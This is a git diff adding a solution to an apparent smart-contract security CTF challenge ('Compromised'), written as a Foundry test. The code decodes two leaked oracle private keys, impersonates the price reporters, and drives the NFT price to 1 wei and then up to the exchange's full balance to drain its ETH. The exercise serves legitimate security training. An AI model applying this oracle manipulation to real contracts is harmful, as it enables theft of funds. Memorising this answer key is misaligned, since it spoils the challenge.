@@ -8,6 +8,7 @@ import {VmSafe} from "forge-std/Vm.sol";
 import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
+import {ExchangeExploiter} from "../../src/compromised/ExchangeExploiter.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
 contract CompromisedChallenge is Test {
@@ -75,7 +76,50 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // To get private key using NodeJS:
+        // key1 = "4d486733..." <-- in hex
+        // Buffer.from(key1, "hex").toString(): "MHg3ZD..." <-- in base64
+        // Buffer.from("MHg3ZD...", "base64").toString(): "0x7d15bba..." <-- private key in hex
+        uint256 trusted1_prv = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 trusted2_prv = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+
+        address trusted1 = vm.addr(trusted1_prv);
+        address trusted2 = vm.addr(trusted2_prv);
+
+        require(trusted1 == sources[0] && trusted2 == sources[1], "Trusted reporters not decoded properly");
+
+        // Manipulate the price to make the median price equal to 1 wei
+        uint256 NEW_PRICE = 1;
+        for (uint256 i = 0; i < sources.length - 1; ++i) {
+            vm.prank(sources[i], sources[i]);
+            oracle.postPrice("DVNFT", NEW_PRICE);
+            vm.stopPrank();
+        }
+
+        // Buy with price = 1 wei
+        vm.prank(player, player);
+        ExchangeExploiter exploiter = new ExchangeExploiter(exchange, recovery);
+        uint256 nftId = exploiter.buyOne{value: NEW_PRICE}();
+        vm.stopPrank();
+
+        // Set price such that selling NFT would take out all the ETH stored in the exchange
+        for (uint256 i = 0; i < sources.length - 1; ++i) {
+            vm.prank(sources[i], sources[i]);
+            oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + NEW_PRICE);
+            vm.stopPrank();
+        }
+
+        // Sell with the new manipulated price
+        vm.prank(player, player);
+        exploiter.sellOne(nftId, EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        // Restore the original price
+        for (uint256 i = 0; i < sources.length - 1; ++i) {
+            vm.prank(sources[i], sources[i]);
+            oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+            vm.stopPrank();
+        }
     }
 
     /**
